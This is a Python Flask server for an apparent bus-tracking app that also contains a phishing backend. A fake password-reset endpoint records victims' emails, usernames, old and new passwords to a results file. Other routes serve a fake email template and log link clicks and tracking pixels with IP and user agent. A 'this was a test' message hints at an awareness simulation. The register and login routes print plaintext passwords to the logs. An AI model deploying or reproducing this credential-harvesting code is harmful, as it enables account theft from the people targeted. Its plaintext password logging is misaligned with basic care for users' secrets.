import os, json
from datetime import datetime
from flask import Flask, request, jsonify, abort, send_file
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
CORS(app)

USERS_FILE = "users.json"
USERS = {}

LOCATIONS_FILE = "locations.json"
LOCATIONS = {}

def load_users():
    global USERS
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            USERS = json.load(f)
    else:
        # default demo accounts
        USERS = {
            "driver": {"username": "driver", "password": generate_password_hash("1234"), "role": "driver"},
            "customer": {"username": "customer", "password": generate_password_hash("1234"), "role": "customer"}
        }
        save_users()

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(USERS, f, indent=2)

def load_locations():
    global LOCATIONS
    if os.path.exists(LOCATIONS_FILE):
        with open(LOCATIONS_FILE, "r") as f:
            LOCATIONS = json.load(f)

def save_locations():
    with open(LOCATIONS_FILE, "w") as f:
        json.dump(LOCATIONS, f, indent=2)

load_users()
load_locations()

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    role = data.get("role")
    if not username or not password or role not in ("driver", "customer"):
        return jsonify({"success": False, "message": "Missing fields"}), 400
    if username in USERS:
        return jsonify({"success": False, "message": "Username exists"}), 400
    USERS[username] = {
        "username": username,
        "password": generate_password_hash(password),
        "role": role,
        "created_at": datetime.utcnow().isoformat()
    }
    save_users()
    print(f"[REGISTER] username={username} password={password} role={role} time={USERS[username]['created_at']}")
    return jsonify({"success": True, "message": f"{role} registered"})

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    role = data.get("role")
    user = USERS.get(username)
    # print login attempt (no need to print password in logs if you prefer)
    print(f"[LOGIN ATTEMPT] username={username} password={password} role={role} time={datetime.utcnow().isoformat()}")
    if user and user["role"] == role and check_password_hash(user["password"], password):
        return jsonify({"success": True, "message": "Welcome!"})
    return jsonify({"success": False, "message": "Invalid credentials"}), 401

@app.route("/routes", methods=["GET"])
def get_routes():
    # Sample real-time bus routes data
    routes = {
        "route1": {
            "path": [[37.7749, -122.4194], [37.7849, -122.4094], [37.7949, -122.3994]],
            "buses": [{"id": "bus1", "position": [37.7749, -122.4194], "status": "moving"}]
        },
        "route2": {
            "path": [[37.7649, -122.4294], [37.7549, -122.4394], [37.7449, -122.4494]],
            "buses": [{"id": "bus2", "position": [37.7649, -122.4294], "status": "stopped"}]
        }
    }
    return jsonify(routes)

@app.route("/phish-log", methods=["POST"])
def phish_log():
    data = request.get_json()
    log_data = {
        **data,
        "event": "phish-log",
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "time": datetime.utcnow().isoformat()
    }
    print(f"[PHISH-LOG] {log_data}")

    with open("phish_results.json", "a") as f:
        f.write(json.dumps(log_data) + "\n")

    return jsonify({"ok": True})


@app.route("/phish-email", methods=["GET"])
def phish_email():
    """Serve fake email template for preview."""
    try:
        with open("email_template.html", "r", encoding='utf-8') as f:
            html = f.read()
        return html.encode('utf-8'), 200, {'Content-Type': 'text/html; charset=utf-8'}
    except FileNotFoundError:
        return "Email template not found.", 404


@app.route("/phish-reset", methods=["GET", "POST"])
def phish_reset():
    data = request.get_json()
    log_data = {
        "event": "phish-reset",
        "email": data.get("email"),
        "username": data.get("username"),
        "old_password": data.get("oldPassword"),
        "new_password": data.get("newPassword"),
        "track_id": data.get("track_id"),
        "ip": request.remote_addr,
        "user_agent": data.get("user_agent", request.headers.get("User-Agent")),
        "time": datetime.utcnow().isoformat()
    }
    print(f"[PHISH-RESET ATTEMPT] {log_data}")

    with open("phish_results.json", "a") as f:
        f.write(json.dumps(log_data) + "\n")

    return jsonify({"success": True, "message": "Password reset successful (demo - this was a test!)"})


@app.route("/phish-report", methods=["POST"])
def phish_report():
    data = request.get_json()
    log_data = {
        "event": "report",
        **data,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "time": datetime.utcnow().isoformat()
    }
    print(f"[PHISH-REPORT] {log_data}")

    with open("phish_results.json", "a") as f:
        f.write(json.dumps(log_data) + "\n")

    return jsonify({"success": True, "message": "Thank you for reporting phishing!"})


@app.route("/phish/track/<event>", methods=["GET"])
def phish_track(event):
    """Tracking endpoint for clicks, opens, pixels."""
    track_id = request.args.get("track_id", "unknown")
    log_data = {
        "event": f"track-{event}",
        "track_id": track_id,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "referrer": request.headers.get("Referer", ""),
        "time": datetime.utcnow().isoformat()
    }
    print(f"[PHISH-TRACK {event.upper()}] {log_data}")

    with open("phish_results.json", "a") as f:
        f.write(json.dumps(log_data) + "\n")

    next_page = request.args.get("next", "")
    if next_page:
        redirect_url = request.host_url.rstrip("/") + next_page
        return f'<meta http-equiv="refresh" content="0;url={redirect_url}">'
    return jsonify({"ok": True})


@app.route("/admin/users", methods=["GET"])
def admin_users():
    # very simple protection: only allow localhost requests
    if request.remote_addr not in ("127.0.0.1", "localhost"):
        abort(403)
    # return users but hide password hashes
    masked = {u: {"username": d["username"], "role": d["role"], "created_at": d.get("created_at")} for u,d in USERS.items()}
    return jsonify(masked)

@app.route("/update", methods=["POST"])
def update_location():
    data = request.get_json()
    busId = data.get("busId")
    lat = data.get("lat")
    lng = data.get("lng")
    speed = data.get("speed")
    if not busId or lat is None or lng is None:
        return jsonify({"ok": False, "error": "Missing required fields: busId, lat, lng"}), 400
    LOCATIONS[busId] = {
        "lat": lat,
        "lng": lng,
        "speed": speed,
        "timestamp": datetime.utcnow().isoformat()
    }
    save_locations()
    print(f"[LOCATION UPDATE] busId={busId} lat={lat} lng={lng} speed={speed}")
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5500, debug=True)

